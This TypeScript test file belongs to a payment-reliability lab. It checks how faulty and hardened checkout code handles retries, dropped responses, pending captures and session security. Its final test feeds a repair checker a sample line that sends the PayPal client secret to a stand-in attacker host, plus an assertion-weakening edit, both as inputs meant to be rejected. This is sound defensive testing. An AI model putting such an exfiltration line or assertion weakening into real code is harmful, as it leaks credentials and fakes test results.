import test from "node:test";
import type { TestContext } from "node:test";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { mkdtemp,rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PostgresDatabase,SqliteDatabase,sha256 } from "@fracture/paypal-core";
import type { SqlDatabase } from "@fracture/paypal-core";
import { initializeDatabase } from "../packages/service/src/database";
import { LabService,LabStore } from "../packages/service/src/index";
import { projectCatalog } from "../packages/service/src/catalog";
import { executeRun,newRun } from "../packages/service/src/executor";
import { scenarios } from "../packages/scenarios/src/index";
import { sessionCookie,requestSession,checkOrigin } from "../packages/service/src/auth";
import { inspectPatch } from "../packages/service/src/repairs";
import type { RunInput } from "../packages/service/src/types";
import { LabError } from "../packages/service/src/errors";
process.env.JUDGE_SESSION_SECRET??="fixture-only-signing-key";

const adapters=(process.env.DATABASE_URL?["sqlite","postgres"]:["sqlite"]) as ("sqlite"|"postgres")[];
async function setup(t:TestContext,adapter:"sqlite"|"postgres"){
  const directory=await mkdtemp(join(tmpdir(),"fracture-app-"));const filename=join(directory,"app.sqlite");const db:SqlDatabase=adapter==="postgres"?new PostgresDatabase(process.env.DATABASE_URL!):new SqliteDatabase(filename);await initializeDatabase(db);const store=new LabStore(db);const service=new LabService(store);const session=await store.createSession("owner");t.after(async()=>{await db.close();await rm(directory,{recursive:true,force:true});});return {db,store,service,session,filename};
}
async function runCase(service:LabService,sessionId:string,scenarioId:string,revision:"faulty"|"hardened",interactive=false){return service.startRun(sessionId,{projectId:"bramble",scenarioId,revision,mode:"sample",seed:"unchanged-test-seed",requestId:randomUUID(),interactive});}
for(const adapter of adapters){
  test(`${adapter}: baseline and control both pass the original happy-path purchase`,async t=>{
    const {store,session}=await setup(t,adapter);const project=(await projectCatalog([]))[0]!;
    for(const revision of ["faulty","hardened"] as const){const input:RunInput={projectId:"bramble",scenarioId:"H0",revision,mode:"sample",seed:"happy",requestId:randomUUID(),interactive:false};const scenario={...scenarios[0]!,id:"H0",hash:sha256("H0-no-fault"),title:"Original happy path"};const created=await store.createRun(session.id,input,newRun(input,scenario,project));const run=await executeRun(store,created.run.id,session.id);assert.equal(run.phoneState,"paid");assert.equal(run.captureCount,1);assert.equal(run.capturedMinor,1200);assert.equal(run.fulfillmentCount,1);assert.equal(run.captures[0]?.status,"COMPLETED");assert.ok(run.events.some(event=>event.kind==="buyer_approved"));}
  });
  test(`${adapter}: S0 faulty retry creates two approved orders, control reconciles one`,async t=>{
    const {store,service,session}=await setup(t,adapter);const faulty=await runCase(service,session.id,"S0","faulty");const control=await runCase(service,session.id,"S0","hardened");
    assert.equal(faulty.captureCount,2);assert.equal(faulty.capturedMinor,2400);assert.equal(new Set(faulty.captures.map(item=>item.orderId)).size,2);assert.equal(faulty.events.filter(event=>event.kind==="buyer_approved").length,2);assert.equal(faulty.verdict,"fail");
    const dropped=faulty.events.find(event=>event.kind==="response_dropped")!;const failure=faulty.events.find(event=>event.kind==="unknown_outcome_presented_failed")!;assert.ok(dropped.sequence<failure.sequence);assert.equal(failure.projection.capturedMinor,1200);assert.equal(failure.projection.phoneState,"failed");
    assert.equal(control.captureCount,1);assert.equal(control.fulfillmentCount,1);assert.equal(control.verdict,"pass");assert.ok(control.events.some(event=>event.kind==="resource_read"));assert.ok(control.events.some(event=>event.kind==="checking_unknown"));assert.ok(!control.events.some(event=>event.kind==="unknown_outcome_presented_failed"));
    const raw=await store.db.query<{document:string}&Record<string,unknown>>("SELECT document FROM lab_target_attempts WHERE run_id=$1",[faulty.id]);assert.ok(raw.rows.every(row=>JSON.parse(row.document).providerRequestId===null));const protectedWrites=await store.db.query<{document:string}&Record<string,unknown>>("SELECT document FROM lab_target_attempts WHERE run_id=$1",[control.id]);assert.ok(protectedWrites.rows.map(row=>JSON.parse(row.document)).filter(item=>item.method==="POST").every(item=>typeof item.providerRequestId==="string"));
  });
  test(`${adapter}: interactive retry and repeated HTTP command identities do not duplicate the experiment`,async t=>{
    const {service,store,session}=await setup(t,adapter);const first=await runCase(service,session.id,"S0","faulty",true);assert.equal(first.stage,"awaiting_approval");assert.equal(first.captureCount,1);assert.equal(first.phoneState,"failed");const requestId=randomUUID();await Promise.all(Array.from({length:6},()=>service.action(session.id,first.id,{action:"advance",requestId})));const after=await store.run(first.id,session.id);assert.equal(after.captureCount,2);assert.equal(after.events.filter(event=>event.kind==="customer_retry").length,1);await service.action(session.id,first.id,{action:"advance",requestId});assert.equal((await store.run(first.id)).captureCount,2);assert.deepEqual(after.events.map(event=>event.sequence),Array.from({length:after.events.length},(_,i)=>i+1));
  });
  test(`${adapter}: unavailable reread remains checking without another purchase`,async t=>{
    const {service,session}=await setup(t,adapter);const run=await runCase(service,session.id,"S3","hardened");assert.equal(run.captureCount,1);assert.equal(run.orderIds.length,1);assert.equal(run.fulfillmentCount,0);assert.equal(run.phoneState,"checking");assert.equal(run.verdict,"inconclusive");assert.equal(run.invariants.find(row=>row.id==="I7")?.verdict,"pass");
  });
  test(`${adapter}: never-sent authentication has no provider mutation or invented reconciliation`,async t=>{
    const {service,session}=await setup(t,adapter);const run=await runCase(service,session.id,"S4","hardened");assert.equal(run.captureCount,0);assert.equal(run.orderIds.length,0);assert.equal(run.fulfillmentCount,0);assert.equal(run.phoneState,"failed");assert.ok(run.events.some(event=>event.kind==="payment_not_sent"));assert.ok(!run.events.some(event=>event.kind==="resource_read"));
  });
  test(`${adapter}: malformed success is reconciled by control and misreported by baseline`,async t=>{
    const {service,session}=await setup(t,adapter);const faulty=await runCase(service,session.id,"S5","faulty");const control=await runCase(service,session.id,"S5","hardened");assert.equal(faulty.captureCount,2);assert.equal(control.captureCount,1);assert.equal(control.phoneState,"paid");assert.equal(control.invariants.find(row=>row.id==="I7")?.verdict,"pass");
  });
  test(`${adapter}: pending capture cannot back fulfillment and does not become completed money`,async t=>{
    const {service,session}=await setup(t,adapter);const faulty=await runCase(service,session.id,"A4","faulty");const control=await runCase(service,session.id,"A4","hardened");assert.equal(faulty.captureCount,0);assert.equal(faulty.fulfillmentCount,1);assert.equal(faulty.invariants.find(row=>row.id==="I3")?.verdict,"fail");assert.equal(control.captureCount,0);assert.equal(control.fulfillmentCount,0);assert.equal(control.phoneState,"checking");assert.equal(control.captures[0]?.status,"PENDING");
  });
  test(`${adapter}: harness safety intervention cannot count as target pass`,async t=>{
    const {service,session}=await setup(t,adapter);for(const revision of ["faulty","hardened"] as const){const run=await runCase(service,session.id,"S10",revision);assert.equal(run.verdict,"inconclusive");assert.ok(run.invariants.every(row=>row.verdict==="inconclusive"||row.verdict==="not_applicable"));assert.equal(run.captureCount,0);}
  });
  test(`${adapter}: partial compensation preserves gross duplicate history and original failure`,async t=>{
    const {service,store,session}=await setup(t,adapter);const run=await runCase(service,session.id,"S0","faulty");await service.action(session.id,run.id,{action:"remediate",requestId:randomUUID()});const compensated=await store.run(run.id);assert.equal(compensated.captureCount,2);assert.equal(compensated.capturedMinor,2400);assert.equal(compensated.refundedMinor,1200);assert.equal(compensated.remediation,"completed");assert.equal(compensated.verdict,"fail");assert.equal(compensated.invariants.find(row=>row.id==="I1")?.verdict,"fail");await service.action(session.id,run.id,{action:"remediate",requestId:randomUUID()});assert.equal((await store.run(run.id)).refunds.length,1);
  });
  test(`${adapter}: session ownership, signed cookies, and immutable command payloads`,async t=>{
    const {service,store,session}=await setup(t,adapter);const requestId=randomUUID();const input:RunInput={projectId:"bramble",scenarioId:"S4",revision:"hardened",mode:"sample",seed:"identity",requestId,interactive:false};const run=await service.startRun(session.id,input);assert.equal((await service.startRun(session.id,input)).id,run.id);await assert.rejects(service.startRun(session.id,{...input,seed:"changed"}),(error:unknown)=>error instanceof LabError&&error.code==="RUN_PAYLOAD_CONFLICT");const stranger=await store.createSession();await assert.rejects(store.run(run.id,stranger.id),(error:unknown)=>error instanceof LabError&&error.code==="RUN_NOT_FOUND");const cookie=sessionCookie(session,false).split(";")[0]!;assert.equal((await requestSession(new Request("http://localhost/api/workspace",{headers:{cookie}}),store))?.id,session.id);assert.equal(await requestSession(new Request("http://localhost/api/workspace",{headers:{cookie:`${cookie}x`}}),store),null);assert.throws(()=>checkOrigin(new Request("http://localhost/api/runs",{method:"POST",headers:{origin:"https://other.example"}})),LabError);
  });
  test(`${adapter}: reload reads durable evidence through a fresh database connection`,async t=>{
    const {service,session,filename}=await setup(t,adapter);const run=await runCase(service,session.id,"S0","hardened");const fresh=adapter==="postgres"?new PostgresDatabase(process.env.DATABASE_URL!):new SqliteDatabase(filename);try{const restored=await new LabStore(fresh).run(run.id,session.id);assert.deepEqual(restored.events,run.events);assert.equal(restored.captureCount,1);assert.equal((await new LabStore(fresh).evidence(session.id)).filter(item=>item.runId===run.id).length,run.events.length);}finally{await fresh.close();}
  });
  test(`${adapter}: expired worker at dispatch boundary cannot blindly replay`,async t=>{
    const {store,session}=await setup(t,adapter);const project=(await projectCatalog([]))[0]!;const input:RunInput={projectId:"bramble",scenarioId:"S0",revision:"faulty",mode:"sample",seed:"crash",requestId:randomUUID(),interactive:false};const created=await store.createRun(session.id,input,newRun(input,scenarios[0]!,project));await store.stage(created.run.id,"executing","first_dispatching");await store.db.query("UPDATE lab_jobs SET stage='running',lease_owner='dead-worker',lease_until=$2 WHERE run_id=$1",[created.run.id,new Date(Date.now()-1000).toISOString()]);const recovered=await executeRun(store,created.run.id,session.id);assert.equal(recovered.stage,"inconclusive");assert.equal(recovered.captureCount,0);assert.ok(recovered.events.some(event=>event.kind==="worker_recovery_uncertain"));assert.equal((await store.db.query("SELECT id FROM lab_target_attempts WHERE run_id=$1",[created.run.id])).rowCount,0);
  });
}
test("repair policy rejects weakened assertions and secret access before execution",()=>{
  assert.equal(inspectPatch("tests/application.test.ts",[{line:1,type:"remove",text:"assert.equal(run.captureCount, 1);"},{line:1,type:"add",text:"assert.ok(run.captureCount >= 1);"}]).find(check=>check.id==="test-integrity")?.passed,false);assert.equal(inspectPatch("apps/fixtures/bramble/faulty.ts",[{line:1,type:"add",text:"fetch('https://attacker.invalid', { body: process.env.PAYPAL_CLIENT_SECRET });"}]).find(check=>check.id==="secret-boundary")?.passed,false);
});
